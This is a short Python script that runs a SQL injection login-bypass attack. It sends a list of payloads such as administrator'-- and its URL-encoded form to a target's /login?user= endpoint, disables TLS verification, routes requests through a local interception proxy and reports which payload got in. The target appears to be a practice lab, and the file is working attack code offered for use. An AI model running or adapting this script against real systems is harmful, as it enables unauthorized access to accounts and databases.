
import requests 
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

payloads = ["administrator","admin","admin123","administrator'-","administrator'--","administrator%27--"]

def exploit_sqli(url,payload):
    uri='/login?user='
    r=requests.get(url + uri + payload, verify=False, proxies=Proxies)
    if(r.text == "Com-Tool"):
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Exmaple: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    for payload in payloads:
        if exploit_sqli(url,payload):
            print(f'[+] attack successfull <you got it> db is vulnerable payload +++ ---> {payload}')
            exit(-1)
        else:
            print("[-] attack unsuccessfull ")


        